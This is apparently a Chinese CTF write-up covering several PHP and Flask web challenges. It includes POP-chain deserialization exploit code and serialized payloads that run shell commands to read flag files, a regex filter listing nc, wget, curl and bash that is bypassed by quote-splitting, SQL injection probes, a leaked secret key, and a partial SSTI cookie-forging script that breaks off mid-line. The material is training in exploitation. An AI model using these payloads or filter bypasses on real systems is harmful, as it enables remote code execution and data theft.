+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">poc:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">construct</span>(<span class="params"><span class="variable">$k</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func=<span class="variable">$k</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">construct</span>(<span class="params"><span class="variable">$k</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj=<span class="variable">$k</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">construct</span>(<span class="params"><span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj=<span class="variable">$k</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&#x27;var_dump&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title class_">Begin</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Then</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Super</span>();</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">Handle</span>();</span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>();</span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> <span class="title class_">WhiteGod</span>();</span><br><span class="line"><span class="variable">$e</span>-&gt;handle=<span class="variable">$f</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="title function_ invoke__">construct</span>(<span class="variable">$e</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">construct</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="title function_ invoke__">construct</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p>传参用burp然后修改hex就可^ _ ^</p>
+<p>——————————————————————————————————————————————————</p>
+<h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>确实是minipop，先处理POP链，要调用__toString魔术方法中的exec()方法，我们要把一个类当做字符串来处理，看到minipop类中__destruct魔术方法中有echo，那懂了啊，就是把$this-&gt;qwejaskdjnlka变成上面提到的类就行了，虽然这两个类是一样的，但是问题不大</p>
+<p>再回到__toString里的exec()，可以看到exec($this-&gt;code)，所以说我们传入给qwe属性的这个类要写入能够RCE的code属性，至于外层minipop类的code属性可以不管，同时内层minpop类的qwe属性也可以不管</p>
+<p>接下来就是如何RCE然后读文件或者下载什么的</p>
+<p>首先要明确exec()和system()的区别</p>
+<p>exec是没有回显的，除非传多个参数，那么会将第一个参数的内容存入第二个参数中，所以ls不会返回到页面上</p>
+<p>而且exec失败的话会报错，对于查看是否成功RCE很友好</p>
+<p>可以传code属性为sleep 3，这样可以让相应延迟3秒，也能查看是否成功RCE</p>
+<p>看一下preg_match，嗯，能过滤的都过滤了，但是没有过滤单双引号，可能如果过滤了就传不了序列化对象了？</p>
+<p>那就很好绕过了，对于php的preg_match，毕竟是php的东西，要过滤linux的智能匹配可太难了</p>
+<p>比如ba””se,ex””ec,py””thon,这些都是可以执行的，翻解法的时候看到了tee方法，很好用，用了之后确实很好用</p>
+<p>所以就用te””e来代替传入code属性中的tee就行了</p>
+<blockquote>
+<p>参考:</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.exec.php">https://www.php.net/manual/zh/function.exec.php</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Kracxi/article/details/121997166">https://blog.csdn.net/Kracxi/article/details/121997166</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">exp:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="comment">//$a-&gt;code=&#x27;ls | te&quot;&quot;e 1&#x27;;</span></span><br><span class="line"><span class="comment">//$a-&gt;code=&#x27;cat /flag_is_h3eeere | te&quot;&quot;e 2&#x27;;</span></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;qwejaskdjnlka=<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>
+
+<p>拿到序列化后的值用hackbar传post参数就行</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line">O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;N;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:12:&quot;ls | te&quot;&quot;e 1&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先传入第一个payload1，然后可以访问&#x2F;1页面，就能看到ls输出的返回值，如果没有flag就多试几次cd和ls</p>
+<p>（一般不会为难人</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload2:</span><br><span class="line">O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;N;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:30:&quot;cat /flag<span class="emphasis">_is_</span>h3eeere | te&quot;&quot;e 2&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现flag_is_h3eere在根目录下，直接cat就行了，用tee下载到&#x2F;2页面上</p>
+<p>访问&#x2F;2页面就能拿到flag</p>
+<p>——————————————————————————————————————————————————</p>
+<h2 id="WEB-week4"><a href="#WEB-week4" class="headerlink" title="WEB-week4"></a>WEB-week4</h2><p>###逃</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))));</span><br></pre></td></tr></table></figure>
+
+<p>可以看到页面显示system(‘whoami’)的结果被打印了两次，第一次是在定义一个新的GetFlag类的时候，调用了__destruct()魔术方法，会自动执行system函数并回显到浏览器上</p>
+<p>第二次是反序列化的时候，相当于将传入的序列化后的GetFlag类重新变成GetFlag类，也会调用__construct()和__destruct()</p>
+<p>首先分析一个单独的GetFlag类，明显可以看出我们可控的变量仅有$key,而$cmd是我们无法控制的</p>
+<p>单纯修改$key的值几乎没什么用，所以可能需要多个类来形成POP链</p>
+<p>但是很显然，我$_GET[‘key’]传入的key值不可能是个类型，所以也没法传入一个类了</p>
+<p>看到str_replace，把所有bad换成good，每换一次字符长度+1，但是序列化后字符长度值不变，</p>
+<p>那就&#x3D;Moe~夺命十三枪，不难，构造一下Payload吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Payload:</span><br><span class="line">need:</span><br><span class="line">&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</span><br><span class="line">badbad...bad</span><br><span class="line">...==need</span><br><span class="line">badbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;bad    -15</span><br><span class="line"></span><br><span class="line">Final:</span><br><span class="line">key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;    //index.php    --22*good-&gt;88</span><br><span class="line">key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>——————————————————————————————————————————————————</p>
+<h3 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>又双叒是POP链题，恼（</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Start.errMsg=Crypto    //Crypto之__toString</span><br><span class="line">Crypto.obj=Reverse    //Reverse之__get</span><br><span class="line">Reverse.func=Pwn      //Pwn之__invoke</span><br><span class="line">Pwn.obj=Web or Misc ?? //Web&amp;Misc之evil()</span><br><span class="line">Web.func=&#x27;system&#x27;</span><br><span class="line">Web.var=&#x27;ls&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>恼，不做了（\ud83d\ude21）</strong></p>
+<p>——————————————————————————————————————————————————</p>
+<h3 id="midsql"><a href="#midsql" class="headerlink" title="midsql"></a>midsql</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;select name, price from items where id = &quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_fetch_all</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$result</span>[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
+
+<p>粗试了一下，发现过滤了空格和&#x3D;</p>
+<p>而且这压根就没有执行任何有效的sql嘛，只有result的莫名嵌套，所以是不会有任何结果的</p>
+<p>传入的是个字符型变量，但是检测应该是发生在拼接语句之前的，所以照理应该是可以执行id里的php语法</p>
+<p>直接打个sleep(2)进去，网页直接开睡，原来直接RCE就行了（？</p>
+<p>就是好像没有回显，所以这…难不成是要拿shell嘛，但是呢好像有点不太对，因为堆叠用不了</p>
+<p>比如1;sleep(1)网页是不睡的，所以得重新审视一下逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1/**/or/**/sleep(2)</span><br><span class="line">1/**/&amp;&amp;/**/sleep(2)</span><br></pre></td></tr></table></figure>
+
+<p>以上POC均不行，要不就是输进去就network-err</p>
+<p>我懂了，我发现sleep(1);sleep(1)也不会让网页睡觉，所以只有当id是个可执行的短语句（不能有分号）才会执行</p>
+<p>——————————————————————————————————————————————————</p>
+<h3 id="Injectme"><a href="#Injectme" class="headerlink" title="Injectme"></a>Injectme</h3><p>目录穿越先拿源码，密钥未知试试读取一下config，没想到确实有（其实没有就做不下去了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</span><br></pre></td></tr></table></figure>
+
+<p>ezSSTI（wrong</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.append(<span class="string">r&#x27;C:\Users\Jednersaous\Desktop\web-test\build\flasksessioncookiemanagermaster&#x27;</span>)</span><br><span class="line"><span class="keyword">import</span> flask_session_cookie_manager3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># cookie_structure = &quot;&#123;&#x27;user&#x27;: \&quot;&#123;% print([][&#x27;_&#x27;&#x27;_cla&#x27;&#x27;ss_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_ba&#x27;&#x27;se_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_subcla&#x27;&#x27;sses_&#x27;&#x27;_&#x27;]()) %&#125;\&quot;&#125;&quot;</span></span><br><span class="line"><span class="comment"># secret = &#x27;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&#x27;</span></span><br><span class="line"><span class="comment"># payload = flask_session_cookie_manager3.FSCM.encode(secret,cookie_structure)</span></span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#find os</span></span><br><span class="line"><span class="comment"># url=&#x27;http://17accd58-671d-4091-b453-94dff0b6c092.node4.buuoj.cn:81/backdoor&#x27;</span></span><br><span class="line"><span class="comment"># for j in range(150):</span></span><br><span class="line"><span class="comment">#     cookie_structure = &quot;&#123;&#x27;user&#x27;: \&quot;&#123;% print([][&#x27;_&#x27;&#x27;_cla&#x27;&#x27;ss_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_ba&#x27;&#x27;se_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_subcla&#x27;&#x27;sses_&#x27;&#x27;_&#x27;]()) %&#125;\&quot;&#125;&quot;</span></span><br><span class="line"><span class="comment">#     a=&#x27;[%d]&#x27; % j</span></span><br><span class="line"><span class="comment">#     cookie_structure=cookie_structure[0:84]+a+cookie_structure[84:100]</span></span><br><span class="line"><span class="comment">#     secret = &#x27;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&#x27;</span></span><br><span class="line"><span class="comment">#     payload = flask_session_cookie_manager3.FSCM.encode(secret,cookie_structure)</span></span><br><span class="line"><span class="comment">#     print(payload)</span></span><br><span class="line"><span class="comment">#     cookiet=&#123;</span></span><br><span class="line"><span class="comment">#         &#x27;session&#x27;: payload</span></span><br><span class="line"><span class="comment">#     &#125;</span></span><br><span class="line"><span 